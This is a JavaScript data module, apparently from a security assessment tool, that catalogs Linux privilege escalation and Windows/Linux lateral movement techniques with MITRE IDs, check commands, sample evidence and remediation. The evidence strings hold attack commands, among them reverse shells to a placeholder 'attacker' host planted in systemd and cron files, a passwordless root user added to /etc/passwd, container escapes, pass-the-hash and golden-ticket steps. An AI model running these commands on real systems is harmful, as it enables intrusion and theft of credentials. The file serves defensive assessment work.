    evidence:`[CHECK] Checking effective capabilities...\n[FOUND] CapEff: 0000003fffffffff (ALL capabilities)\n[FOUND] Running with CAP_SYS_ADMIN\n[RISK]  Can mount host filesystem, modify kernel parameters\n[EXPLOIT] mount /dev/sda1 /mnt; chroot /mnt; bash\n[+]    Host filesystem access achieved`,
    remediation:"Drop unnecessary capabilities in containers. Use seccomp profiles. Never run containers with --privileged." },

  // ── 4. Cron Jobs ─────────────────────────────────────────────────────────────
  { id:"LNX-CRON-001", cat:"Cron Jobs", mitre:"T1053.003", platform:"Linux",
    name:"Writable Cron Script (Root)", type:"Safe Check", sev:"Critical", cvss:9.0,
    description:"Root-owned cron jobs executing world-writable scripts allow privilege escalation.",
    safeCheck:`cat /etc/crontab\nls -la /etc/cron.d/\nfor f in $(cat /etc/crontab | awk '{print $NF}'); do ls -la $f 2>/dev/null; done`,
    evidence:`[CHECK] Parsing /etc/crontab...\n[FOUND] */5 * * * * root /opt/scripts/backup.sh\n[ACL]   -rw-rw-rw- root root /opt/scripts/backup.sh (WORLD WRITABLE)\n[INJECT] echo 'chmod +s /bin/bash' >> /opt/scripts/backup.sh\n[WAIT]  5 minutes...\n[+]    /bin/bash -p → root shell`,
    remediation:"Fix script permissions: chmod 700 /opt/scripts/backup.sh. Audit all cron jobs and their executables." },

  { id:"LNX-CRON-002", cat:"Cron Jobs", mitre:"T1053.003", platform:"Linux",
    name:"Cron PATH Hijacking", type:"Safe Check", sev:"High", cvss:7.8,
    description:"If cron PATH includes user-writable directories before system directories, malicious binaries can be executed as root.",
    safeCheck:`cat /etc/crontab | grep ^PATH`,
    evidence:`[FOUND] PATH=/home/user:/usr/local/sbin:/usr/bin\n[FOUND] Cron job: * * * * * root backup\n[FOUND] /home/user (writable by current user)\n[ATTACK] echo '#!/bin/bash\\nchmod +s /bin/bash' > /home/user/backup\n[WAIT]  Next cron execution...\n[+]    /bin/bash -p → root shell`,
    remediation:"Set cron PATH to absolute system paths only. Never include user-writable directories in cron PATH." },

  // ── 5. Systemd Services ───────────────────────────────────────────────────────
  { id:"LNX-SYSD-001", cat:"Systemd Services", mitre:"T1543.002", platform:"Linux",
    name:"Writable Systemd Unit File", type:"Safe Check", sev:"Critical", cvss:9.0,
    description:"Systemd unit files writable by unprivileged users allow modification of service commands executed as root.",
    safeCheck:`find /etc/systemd/system /lib/systemd/system -writable 2>/dev/null`,
    evidence:`[CHECK] Checking systemd unit file permissions...\n[FOUND] /etc/systemd/system/webapp.service writable!\n[INJECT] ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'\n[CMD]   systemctl daemon-reload && systemctl restart webapp\n[+]    Root reverse shell received`,
    remediation:"Fix unit file permissions: chmod 644 /etc/systemd/system/webapp.service. Only root should write unit files." },

  // ── 6. PATH Hijacking ─────────────────────────────────────────────────────────
  { id:"LNX-PATH-001", cat:"PATH Hijacking", mitre:"T1574.007", platform:"Linux",
    name:"Relative Command in SUID Script", type:"Safe Check", sev:"High", cvss:7.8,
    description:"SUID scripts calling commands by relative path (not absolute) can be hijacked via PATH manipulation.",
    safeCheck:`cat /opt/suid-script.sh | grep -v '^#' | grep -v '^$'`,
    evidence:`[FOUND] /opt/suid-script.sh (SUID set)\n[CONTENT] #!/bin/bash\\nservice apache2 restart\n[NOTE]  Uses relative 'service' command\n[ATTACK] mkdir /tmp/attack; echo '#!/bin/bash\\nbash -p' > /tmp/attack/service; chmod +x /tmp/attack/service\n[ATTACK] PATH=/tmp/attack:$PATH /opt/suid-script.sh\n[+]    Root shell via PATH hijack`,
    remediation:"Always use absolute paths in scripts. Set PATH explicitly at script start. Never use SUID on shell scripts." },

  // ── 7. Kernel CVEs (Linux) ────────────────────────────────────────────────────
  { id:"LNX-KERN-001", cat:"Kernel CVEs", mitre:"T1068", platform:"Linux",
    name:"Dirty Cow (CVE-2016-5195)", type:"Metasploit", sev:"Critical", cvss:7.0,
    description:"Race condition in Linux kernel copy-on-write allows local privilege escalation on kernels <4.8.3.",
    safeCheck:`uname -r`,
    msfModule:"exploit/linux/local/dirtycow",
    evidence:`[CHECK] uname -r → 3.13.0-24-generic\n[CVE]   CVE-2016-5195 (Dirty Cow)\n[MSF]   use exploit/linux/local/dirtycow\n[*]    Compiling exploit on target...\n[+]    PTRACE_POKEDATA race condition triggered\n[+]    /etc/passwd modified → root shell\n[NOTE]  Affects kernels 2.x-4.8.2`,
    remediation:"Upgrade kernel to 4.8.3+. Apply distribution security patches immediately. Enable SMEP/SMAP kernel protections." },

  { id:"LNX-KERN-002", cat:"Kernel CVEs", mitre:"T1068", platform:"Linux",
    name:"Overlayfs Privilege Escalation (CVE-2021-3493)", type:"Metasploit", sev:"Critical", cvss:7.8,
    description:"Overlayfs implementation vulnerability in Ubuntu kernels allows local privilege escalation.",
    safeCheck:`uname -r; cat /etc/os-release | grep PRETTY_NAME`,
    msfModule:"exploit/linux/local/overlayfs_priv_esc",
    evidence:`[CHECK] Ubuntu 20.04 LTS — Kernel 5.4.0-42-generic\n[CVE]   CVE-2021-3493\n[MSF]   use exploit/linux/local/overlayfs_priv_esc\n[+]    Root shell obtained via overlayfs capability inheritance`,
    remediation:"Apply Ubuntu security patches: apt-get update && apt-get upgrade. Kernel 5.11.0-1007+ is patched." },

  { id:"LNX-KERN-003", cat:"Kernel CVEs", mitre:"T1068", platform:"Linux",
    name:"Kernel Version CVE Fingerprint", type:"Safe Check", sev:"High", cvss:8.0,
    description:"Identifies running kernel version and matches against known local privilege escalation CVEs.",
    safeCheck:`uname -a\ncat /proc/version\nlsb_release -a 2>/dev/null`,
    msfModule:"post/multi/recon/local_exploit_suggester",
    evidence:`[CHECK] uname -a → Linux metasploitable 2.6.24-16-server\n[CVE-MATCH] CVE-2009-1185 (udev)\n[CVE-MATCH] CVE-2008-0600 (vmsplice)\n[CVE-MATCH] CVE-2010-3904 (rds socket)\n[RISK]  Multiple local LPE CVEs for kernel 2.6.24\n[MSF]   local_exploit_suggester: 6 exploits applicable`,
    remediation:"Upgrade kernel. If upgrading is not possible, implement additional access controls and monitor for exploitation indicators." },

  // ── 8. Docker Escape ──────────────────────────────────────────────────────────
  { id:"LNX-DOCK-001", cat:"Docker Escape", mitre:"T1611", platform:"Linux",
    name:"Docker Socket Exposure", type:"Safe Check", sev:"Critical", cvss:9.8,
    description:"Mounting /var/run/docker.sock inside a container gives full Docker daemon control and host filesystem access.",
    safeCheck:`ls -la /var/run/docker.sock 2>/dev/null\nmount | grep docker`,
    msfModule:"exploit/linux/local/docker_daemon_privilege_escalation",
    evidence:`[CHECK] ls -la /var/run/docker.sock\n[FOUND] srw-rw---- root docker /var/run/docker.sock\n[FOUND] Current user is in 'docker' group!\n[EXPLOIT] docker run -v /:/mnt --rm -it alpine chroot /mnt sh\n[+]    Host root filesystem mounted at /mnt\n[+]    Shell as root on host system`,
    remediation:"Never mount Docker socket in containers. Remove unprivileged users from docker group. Use rootless Docker." },

  { id:"LNX-DOCK-002", cat:"Docker Escape", mitre:"T1611", platform:"Linux",
    name:"Privileged Container Escape", type:"Safe Check", sev:"Critical", cvss:9.8,
    description:"Containers running with --privileged flag have full host capabilities and can access host devices.",
    safeCheck:`cat /proc/self/status | grep CapEff\nls /dev | wc -l`,
    evidence:`[CHECK] CapEff: 0000003fffffffff (ALL CAPABILITIES)\n[CHECK] 256 devices in /dev (host devices accessible)\n[EXPLOIT] mkdir /mnt/host; mount /dev/sda1 /mnt/host\n[EXPLORE] cat /mnt/host/etc/shadow → root hash\n[EXPLORE] chroot /mnt/host bash → full host access`,
    remediation:"Never use --privileged. Use specific --cap-add for required capabilities. Implement seccomp profiles. Use gVisor/kata containers." },

  // ── 9. NFS ────────────────────────────────────────────────────────────────────
  { id:"LNX-NFS-001", cat:"NFS Misconfigs", mitre:"T1210", platform:"Linux",
    name:"NFS no_root_squash", type:"Safe Check", sev:"Critical", cvss:8.8,
    description:"NFS exports with no_root_squash allow remote root users to access files as root on the NFS server.",
    safeCheck:`cat /etc/exports\nshowmount -e localhost 2>/dev/null`,
    evidence:`[CHECK] cat /etc/exports\n[FOUND] /home *(rw,sync,no_root_squash)\n[FOUND] /data 192.168.1.0/24(rw,no_root_squash)\n[EXPLOIT] mount -t nfs target:/home /mnt/nfs\n[EXPLOIT] cp /bin/bash /mnt/nfs/; chmod +s /mnt/nfs/bash\n[+]    /home/bash -p → root shell on target`,
    remediation:"Remove no_root_squash from all NFS exports. Use root_squash (default). Restrict NFS exports to specific IPs." },

  // ── 10. Writable Root Files ───────────────────────────────────────────────────
  { id:"LNX-WRIT-001", cat:"Writable Root Files", mitre:"T1222", platform:"Linux",
    name:"/etc/passwd Writable", type:"Safe Check", sev:"Critical", cvss:9.8,
    description:"If /etc/passwd is world-writable, adding a new root-level user with no password grants immediate root access.",
    safeCheck:`ls -la /etc/passwd /etc/shadow /etc/crontab /etc/sudoers`,
    evidence:`[CHECK] ls -la /etc/passwd\n[-rw-rw-rw-] 666 root root /etc/passwd (WORLD WRITABLE!)\n[EXPLOIT] echo 'haxor::0:0::/root:/bin/bash' >> /etc/passwd\n[CMD]   su - haxor\n[+]    root shell (no password required)`,
    remediation:"Immediately fix: chmod 644 /etc/passwd. Check for other writable sensitive files. Review with: ls -la /etc/ | grep -v 'root root'" },

  { id:"LNX-WRIT-002", cat:"Writable Root Files", mitre:"T1222", platform:"Linux",
    name:"World-Writable /etc/cron.d Files", type:"Safe Check", sev:"Critical", cvss:9.0,
    description:"World-writable cron configuration files allow injection of root-level cron jobs.",
    safeCheck:`ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ 2>/dev/null`,
    evidence:`[CHECK] ls -la /etc/cron.d/\n[FOUND] -rw-rw-rw- root root /etc/cron.d/logrotate\n[INJECT] echo '* * * * * root bash -i >& /dev/tcp/attacker/4444 0>&1' >> /etc/cron.d/logrotate\n[WAIT]  60 seconds...\n[+]    Reverse root shell received`,
    remediation:"Fix permissions: chmod 644 /etc/cron.d/*. Only root should write to cron directories." },

  // ── 11. Kernel Modules ────────────────────────────────────────────────────────
  { id:"LNX-KMOD-001", cat:"Kernel Modules", mitre:"T1547.006", platform:"Linux",
    name:"Loadable Kernel Module Exposure", type:"Safe Check", sev:"High", cvss:7.8,
    description:"If a user can load kernel modules, they can insert malicious code running in kernel space.",
    safeCheck:`cat /proc/sys/kernel/modules_disabled\nlsmod\ncap_permitted: $(cat /proc/self/status | grep CapPrm)`,
    evidence:`[CHECK] /proc/sys/kernel/modules_disabled = 0\n[FOUND] Current user has CAP_SYS_MODULE\n[RISK]  Can load arbitrary kernel module\n[CODE]  insmod malicious.ko\n[+]    Kernel rootkit loaded — all security bypassed`,
    remediation:"Set kernel.modules_disabled=1 after boot. Remove CAP_SYS_MODULE from non-root processes. Use Secure Boot + module signing." },
];

// ─── Lateral Movement ────────────────────────────────────────────────────────
const LATERAL_MOVEMENT = [

  // ── RDP ──────────────────────────────────────────────────────────────────────
  { id:"LAT-RDP-001", cat:"RDP", mitre:"T1021.001", platform:"Windows",
    name:"RDP Valid Credential Access", type:"Safe Check", sev:"High", cvss:8.0,
    description:"Tests RDP connectivity and valid credential access to remote Windows hosts.",
    safeCheck:`nmap -p 3389 --script rdp-enum-encryption <target>`,
    evidence:`[CHECK] Port 3389 open on 192.168.195.155\n[CHECK] RDP fingerprint: Windows 10/2019\n[TEST]  xfreerdp /u:Administrator /p:found_password /v:192.168.195.155\n[+]    RDP session established as Administrator`,
    remediation:"Enable Network Level Authentication (NLA). Restrict RDP to VPN only. Implement MFA for RDP. Use Privileged Access Workstations." },

  { id:"LAT-RDP-002", cat:"RDP", mitre:"T1021.001", platform:"Windows",
    name:"BlueKeep RDP CVE-2019-0708", type:"Metasploit", sev:"Critical", cvss:9.8,
    description:"Pre-auth RCE in RDP on Windows 7/2008R2 without NLA enabled.",
    safeCheck:`nmap -p 3389 --script rdp-vuln-ms12-020 <target>`,
    msfModule:"exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
    evidence:`[CHECK] RDP port 3389 open, NLA disabled\n[CVE]   CVE-2019-0708 (BlueKeep)\n[MSF]   use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n[MSF]   set RHOSTS 192.168.195.139\n[+]    SYSTEM Meterpreter session opened`,
    remediation:"Apply KB4499175 immediately. Enable NLA. Disable RDP if not required. Block 3389 at perimeter firewall." },

  // ── SMB / Admin Shares ────────────────────────────────────────────────────────
  { id:"LAT-SMB-001", cat:"SMB/Admin Shares", mitre:"T1021.002", platform:"Windows",
    name:"EternalBlue MS17-010 (WannaCry)", type:"Metasploit", sev:"Critical", cvss:9.8,
    description:"Critical SMB vulnerability used by WannaCry ransomware. Unauthenticated SYSTEM code execution.",
    safeCheck:`nmap -p 445 --script smb-vuln-ms17-010 <target>`,
    msfModule:"exploit/windows/smb/ms17_010_eternalblue",
    evidence:`[NMAP]  Host is VULNERABLE to MS17-010!\n[MSF]   use exploit/windows/smb/ms17_010_eternalblue\n[MSF]   set RHOSTS 192.168.195.139\n[MSF]   set PAYLOAD windows/x64/meterpreter/reverse_tcp\n[+]    NT AUTHORITY\\SYSTEM Meterpreter session 1 opened`,
    remediation:"Apply MS17-010 patch immediately. Disable SMBv1. Block 445 at perimeter. Enable Windows Firewall." },

  { id:"LAT-SMB-002", cat:"SMB/Admin Shares", mitre:"T1021.002", platform:"Windows",
    name:"SMB Null Session Enumeration", type:"Safe Check", sev:"High", cvss:7.5,
    description:"Anonymous SMB connections allow share enumeration and user/group discovery.",
    safeCheck:`smbclient -N -L //<target>\nenum4linux -a <target>`,
    evidence:`[CMD] smbclient -N -L //192.168.195.139\n[FOUND] Anonymous login successful\n[SHARES] IPC$, ADMIN$, tmp\n[USERS] enum4linux → Administrator, user, msfadmin\n[RISK]  Credential attack surface significantly increased`,
    remediation:"Set RestrictAnonymous=2 in registry. Disable SMBv1. Require SMB signing. Restrict null session access." },

  { id:"LAT-SMB-003", cat:"SMB/Admin Shares", mitre:"T1557.001", platform:"Windows",
    name:"SMB Relay Attack (NTLM)", type:"Metasploit", sev:"Critical", cvss:8.8,
    description:"When SMB signing is disabled, NTLM authentication can be relayed to access other systems.",
    safeCheck:`nmap --script smb-security-mode -p 445 <target>`,
    msfModule:"auxiliary/server/capture/smb",
    evidence:`[CHECK] SMB signing: DISABLED on target\n[MSF]   use auxiliary/server/capture/smb\n[MSF]   Waiting for authentication...\n[RELAY] NTLM hash captured: Administrator::DOMAIN:aad3b435...\n[+]    Relayed hash authenticated to target2 → SYSTEM shell`,
    remediation:"Enable SMB signing via GPO. Implement MFA. Enable Protected Users group. Monitor for NTLM relay tools." },

  // ── SSH ───────────────────────────────────────────────────────────────────────
  { id:"LAT-SSH-001", cat:"SSH", mitre:"T1021.004", platform:"Linux",
    name:"SSH Default/Weak Credentials", type:"Metasploit", sev:"High", cvss:8.1,
    description:"SSH services with default or weak credentials allow unauthorized remote access.",
    safeCheck:`nmap -p 22 --script ssh-brute --script-args userdb=/tmp/users.txt,passdb=/tmp/pass.txt <target>`,
    msfModule:"auxiliary/scanner/ssh/ssh_login",
    evidence:`[MSF] use auxiliary/scanner/ssh/ssh_login\n[MSF] set RHOSTS 192.168.195.139\n[MSF] set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt\n[MSF] set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt\n[+]   Success: 'msfadmin:msfadmin' → Linux msfadmin 2.6.24\n[+]   SSH session established`,
    remediation:"Disable password authentication. Use SSH keys only. Implement fail2ban. Restrict SSH to known IPs." },

  { id:"LAT-SSH-002", cat:"SSH", mitre:"T1021.004", platform:"Linux",
    name:"SSH Key Theft & Reuse", type:"Safe Check", sev:"High", cvss:7.8,
    description:"Private SSH keys found on compromised hosts can enable lateral movement to other systems.",
    safeCheck:`find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null\ncat ~/.ssh/known_hosts 2>/dev/null`,
    evidence:`[FOUND] /home/user/.ssh/id_rsa (private key!)\n[FOUND] /root/.ssh/id_rsa\n[FOUND] /home/user/.ssh/known_hosts → 5 hosts\n[FOUND] authorized_keys allows access to: webserver01, dbserver02\n[CMD]   ssh -i /home/user/.ssh/id_rsa root@dbserver02\n[+]    Lateral movement to dbserver02 as root`,
    remediation:"Use SSH certificate authority instead of static keys. Set 600 permissions on .ssh directory. Rotate compromised keys immediately." },

  // ── WinRM ─────────────────────────────────────────────────────────────────────
  { id:"LAT-WINRM-001", cat:"WinRM", mitre:"T1021.006", platform:"Windows",
    name:"PowerShell Remoting via WinRM", type:"Metasploit", sev:"High", cvss:8.0,
    description:"Windows Remote Management (WinRM) with valid credentials allows remote PowerShell execution.",
    safeCheck:`nmap -p 5985,5986 --script http-auth <target>`,
    msfModule:"exploit/windows/winrm/winrm_script_exec",
    evidence:`[CHECK] Port 5985 open (WinRM HTTP)\n[CRED]  Using captured credentials: admin:P@ssw0rd\n[MSF]   use exploit/windows/winrm/winrm_script_exec\n[+]    PowerShell remote session established\n[CMD]   Invoke-Command -ComputerName target -ScriptBlock {whoami}\n[+]    NT AUTHORITY\\SYSTEM`,
    remediation:"Restrict WinRM to management network. Require HTTPS (port 5986). Implement JEA (Just Enough Administration). Log all remoting sessions." },

  // ── VNC ───────────────────────────────────────────────────────────────────────
  { id:"LAT-VNC-001", cat:"VNC", mitre:"T1021.005", platform:"Linux/Windows",
    name:"VNC No Authentication / Weak Password", type:"Metasploit", sev:"High", cvss:8.5,
    description:"VNC server with no authentication or weak password allows full GUI access to the target.",
    safeCheck:`nmap -p 5900 --script vnc-info,vnc-brute <target>`,
    msfModule:"auxiliary/scanner/vnc/vnc_login",
    evidence:`[NMAP]  VNC Version: 3.3 (protocol 3.3)\n[NMAP]  Authentication: None (no password required!)\n[MSF]   use auxiliary/scanner/vnc/vnc_login\n[+]    192.168.195.139:5900 - Login Successful: "":\n[ACCESS] Full GUI desktop access — no credentials needed`,
    remediation:"Enable VNC authentication with strong password. Use VeNCrypt for TLS encryption. Restrict VNC to localhost + SSH tunnel." },

  // ── WMI/DCOM ─────────────────────────────────────────────────────────────────
  { id:"LAT-WMI-001", cat:"WMI/DCOM", mitre:"T1021.003", platform:"Windows",
    name:"WMI Remote Code Execution", type:"Metasploit", sev:"High", cvss:8.8,
    description:"WMI allows remote code execution with valid credentials and is a common LOLBin technique.",
    safeCheck:`nmap -p 135 --script msrpc-enum <target>`,
    msfModule:"exploit/windows/wmi/wmi_exec",
    evidence:`[MSF]   use exploit/windows/wmi/wmi_exec\n[CMD]   wmic /node:192.168.195.155 process call create "powershell.exe -enc <b64payload>"\n[+]    Process created remotely via WMI\n[+]    Meterpreter callback received`,
    remediation:"Restrict WMI to Administrators. Enable WMI activity logging. Block DCOM ports (135, 49152-65535) at perimeter." },

  // ── Pass-the-Hash ─────────────────────────────────────────────────────────────
  { id:"LAT-PTH-001", cat:"Pass-the-Hash", mitre:"T1550.002", platform:"Windows",
    name:"NTLM Pass-the-Hash via PsExec", type:"Metasploit", sev:"Critical", cvss:9.0,
    description:"Captured NTLM hashes can authenticate to remote systems without knowing the plaintext password.",
    safeCheck:`crackmapexec smb <target_range> --sam`,
    msfModule:"exploit/windows/smb/psexec",
    evidence:`[HASH]  Administrator: aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c\n[MSF]   use exploit/windows/smb/psexec\n[MSF]   set SMBUser Administrator\n[MSF]   set SMBPass aad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c\n[MSF]   set RHOSTS 192.168.195.155\n[+]    NT AUTHORITY\\SYSTEM shell via PtH`,
    remediation:"Enable Protected Users security group. Deploy Windows Defender Credential Guard. Enforce unique local admin passwords (LAPS). Disable NTLMv1." },

  { id:"LAT-PTH-002", cat:"Pass-the-Hash", mitre:"T1550.002", platform:"Windows",
    name:"CrackMapExec Network Spraying", type:"Safe Check", sev:"Critical", cvss:9.0,
    description:"Uses captured hashes against entire network ranges to find systems with hash reuse.",
    safeCheck:`crackmapexec smb 192.168.195.0/24 -u Administrator -H <hash>`,
    evidence:`[CMD] crackmapexec smb 192.168.195.0/24 -u Administrator -H 8846f7eaee8fb117...\n[+]   192.168.195.139 PWNED! (Pwn3d!)\n[+]   192.168.195.155 PWNED! (Pwn3d!)\n[-]   192.168.195.140 STATUS_LOGON_FAILURE\n[RISK] 2/3 hosts compromised via hash reuse`,
    remediation:"Implement LAPS (unique local admin passwords). Require MFA for privileged accounts. Segment network to limit blast radius." },

  // ── Pass-the-Ticket ───────────────────────────────────────────────────────────
  { id:"LAT-PTT-001", cat:"Pass-the-Ticket", mitre:"T1550.003", platform:"Windows",
    name:"Kerberos Golden Ticket", type:"Metasploit", sev:"Critical", cvss:10.0,
    description:"Forging Kerberos TGTs using the KRBTGT hash grants persistent, undetectable domain admin access.",
    safeCheck:`Get-ADUser krbtgt -Properties PasswordLastSet`,
    msfModule:"exploit/windows/local/ms14_068_kerberos_checksum",
    evidence:`[MSF] sekurlsa::krbtgt\n[HASH] KRBTGT: 819af826bb148e2e83a62e832811a9b\n[MSF] kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:819af826...\n[+]   Golden Ticket created\n[+]   Pass-the-Ticket: access to ALL domain resources`,
    remediation:"Reset KRBTGT password TWICE (invalidates all tickets). Enable Privileged Identity Management. Use Authentication Policies. Monitor for TGT anomalies." },

  // ── Remote Service Exploitation ───────────────────────────────────────────────
  { id:"LAT-RSE-001", cat:"Remote Svc Exploit", mitre:"T1210", platform:"Linux/Windows",
    name:"Vulnerable Service Discovery (Full Network)", type:"Metasploit", sev:"Critical", cvss:9.8,
    description:"Scans internal network for services vulnerable to known exploits to pivot laterally.",
    safeCheck:`nmap -sV -p 21,22,23,80,135,139,443,445,1433,3306,3389 <subnet>`,
    msfModule:"auxiliary/scanner/portscan/tcp",
    evidence:`[NMAP]  Network sweep 192.168.195.0/24\n[+]    192.168.195.139:21 — vsftpd 2.3.4 (BACKDOOR CVE-2011-2523)\n[+]    192.168.195.139:445 — Samba 3.X (CVE-2007-2447)\n[+]    192.168.195.155:3389 — RDP (BlueKeep check needed)\n[RISK]  Multiple critical services discovered for lateral movement`,
    remediation:"Implement network segmentation. Use internal firewalls. Patch all vulnerable services. Deploy IDS/IPS for lateral movement detection." },
];

// ─── Module Registry ──────────────────────────────────────────────────────────
const ALL_MODULES = [...WINDOWS_PE, ...LINUX_PE, ...LATERAL_MOVEMENT];

const MODULE_CATEGORIES = {
  // Windows
  "UAC & Elevation":    { platform:"Windows", mitre:"T1548.002", icon:"🛡",  count: WINDOWS_PE.filter(m=>m.cat==="UAC & Elevation").length },
  "Service Misconfigs": { platform:"Windows", mitre:"T1574.009", icon:"⚙",   count: WINDOWS_PE.filter(m=>m.cat==="Service Misconfigs").length },
  "Scheduled Tasks":    { platform:"Windows", mitre:"T1053.005", icon:"⏰",  count: WINDOWS_PE.filter(m=>m.cat==="Scheduled Tasks").length },
  "DLL Hijacking":      { platform:"Windows", mitre:"T1574.001", icon:"🔗",  count: WINDOWS_PE.filter(m=>m.cat==="DLL Hijacking").length },
  "Credential & Token": { platform:"Windows", mitre:"T1134",     icon:"🔑",  count: WINDOWS_PE.filter(m=>m.cat==="Credential & Token").length },
  "Registry Weaknesses":{ platform:"Windows", mitre:"T1547.001", icon:"📋",  count: WINDOWS_PE.filter(m=>m.cat==="Registry Weaknesses").length },
  "Kernel CVEs":        { platform:"Windows", mitre:"T1068",     icon:"💻",  count: WINDOWS_PE.filter(m=>m.cat==="Kernel CVEs").length },
  "Process Injection":  { platform:"Windows", mitre:"T1055",     icon:"💉",  count: WINDOWS_PE.filter(m=>m.cat==="Process Injection").length },
  "Service Account Abuse":{ platform:"Windows", mitre:"T1078.003", icon:"👤", count: WINDOWS_PE.filter(m=>m.cat==="Service Account Abuse").length },
  "Print/Spooler Abuse":{ platform:"Windows", mitre:"T1547.012", icon:"🖨",  count: WINDOWS_PE.filter(m=>m.cat==="Print/Spooler Abuse").length },
  // Linux
  "Sudo & Sudoers":     { platform:"Linux",   mitre:"T1548.003", icon:"🔒",  count: LINUX_PE.filter(m=>m.cat==="Sudo & Sudoers").length },
  "SUID/SGID":          { platform:"Linux",   mitre:"T1548.001", icon:"🚩",  count: LINUX_PE.filter(m=>m.cat==="SUID/SGID").length },
  "Linux Capabilities": { platform:"Linux",   mitre:"T1548",     icon:"⚡",  count: LINUX_PE.filter(m=>m.cat==="Linux Capabilities").length },
  "Cron Jobs":          { platform:"Linux",   mitre:"T1053.003", icon:"⏱",  count: LINUX_PE.filter(m=>m.cat==="Cron Jobs").length },
  "Systemd Services":   { platform:"Linux",   mitre:"T1543.002", icon:"🔄",  count: LINUX_PE.filter(m=>m.cat==="Systemd Services").length },
  "PATH Hijacking":     { platform:"Linux",   mitre:"T1574.007", icon:"📂",  count: LINUX_PE.filter(m=>m.cat==="PATH Hijacking").length },
  "Docker Escape":      { platform:"Linux",   mitre:"T1611",     icon:"🐳",  count: LINUX_PE.filter(m=>m.cat==="Docker Escape").length },
  "NFS Misconfigs":     { platform:"Linux",   mitre:"T1210",     icon:"📡",  count: LINUX_PE.filter(m=>m.cat==="NFS Misconfigs").length },
  "Writable Root Files":{ platform:"Linux",   mitre:"T1222",     icon:"✏️",  count: LINUX_PE.filter(m=>m.cat==="Writable Root Files").length },
  "Kernel Modules":     { platform:"Linux",   mitre:"T1547.006", icon:"🧩",  count: LINUX_PE.filter(m=>m.cat==="Kernel Modules").length },
  // Lateral Movement
  "RDP":                { platform:"Windows", mitre:"T1021.001", icon:"🖥",  count: LATERAL_MOVEMENT.filter(m=>m.cat==="RDP").length },
  "SMB/Admin Shares":   { platform:"Windows", mitre:"T1021.002", icon:"📁",  count: LATERAL_MOVEMENT.filter(m=>m.cat==="SMB/Admin Shares").length },
  "SSH":                { platform:"Linux",   mitre:"T1021.004", icon:"🔐",  count: LATERAL_MOVEMENT.filter(m=>m.cat==="SSH").length },
  "WinRM":              { platform:"Windows", mitre:"T1021.006", icon:"💻",  count: LATERAL_MOVEMENT.filter(m=>m.cat==="WinRM").length },
  "VNC":                { platform:"Any",     mitre:"T1021.005", icon:"👁",  count: LATERAL_MOVEMENT.filter(m=>m.cat==="VNC").length },
  "WMI/DCOM":           { platform:"Windows", mitre:"T1021.003", icon:"⚙",   count: LATERAL_MOVEMENT.filter(m=>m.cat==="WMI/DCOM").length },
  "Pass-the-Hash":      { platform:"Windows", mitre:"T1550.002", icon:"🔑",  count: LATERAL_MOVEMENT.filter(m=>m.cat==="Pass-the-Hash").length },
  "Pass-the-Ticket":    { platform:"Windows", mitre:"T1550.003", icon:"🎫",  count: LATERAL_MOVEMENT.filter(m=>m.cat==="Pass-the-Ticket").length },
  "Remote Svc Exploit": { platform:"Any",     mitre:"T1210",     icon:"💥",  count: LATERAL_MOVEMENT.filter(m=>m.cat==="Remote Svc Exploit").length },
};

const MITRE_TACTICS = [
  { id:"TA0001", name:"Initial Access",     color:"#ef5350" },
  { id:"TA0002", name:"Execution",          color:"#ff8800" },
  { id:"TA0003", name:"Persistence",        color:"#ffcc00" },
  { id:"TA0004", name:"Privilege Esc",      color:"#e8912d" },
  { id:"TA0005", name:"Defense Evasion",    color:"#4fc3f7" },
  { id:"TA0006", name:"Credential Access",  color:"#ce93d8" },
  { id:"TA0007", name:"Discovery",          color:"#80cbc4" },
  { id:"TA0008", name:"Lateral Movement",   color:"#a5d6a7" },
  { id:"TA0009", name:"Collection",         color:"#dce775" },
  { id:"TA0010", name:"Exfiltration",       color:"#ff8a65" },
  { id:"TA0011", name:"Command & Control",  color:"#4fc3f7" },
  { id:"TA0040", name:"Impact",             color:"#ef5350" },
];

function getModulesByCategory(category) {
  return ALL_MODULES.filter(m => m.cat === category);
}

function getModulesByMitre(mitreId) {
  return ALL_MODULES.filter(m => m.mitre === mitreId || m.mitre.startsWith(mitreId));
}

function getModulesByPlatform(platform) {
  return ALL_MODULES.filter(m => m.platform === platform || m.platform.includes(platform));
}

function getStats() {
  return {
    total: ALL_MODULES.length,
    windows: WINDOWS_PE.length,
    linux: LINUX_PE.length,
    lateral: LATERAL_MOVEMENT.length,
    critical: ALL_MODULES.filter(m=>m.sev==="Critical").length,
    high: ALL_MODULES.filter(m=>m.sev==="High").length,
    withMsf: ALL_MODULES.filter(m=>m.msfModule).length,
    categories: Object.keys(MODULE_CATEGORIES).length,
  };
}

module.exports = {
  ALL_MODULES, WINDOWS_PE, LINUX_PE, LATERAL_MOVEMENT,
  MODULE_CATEGORIES, MITRE_TACTICS,
  getModulesByCategory, getModulesByMitre, getModulesByPlatform, getStats,
};
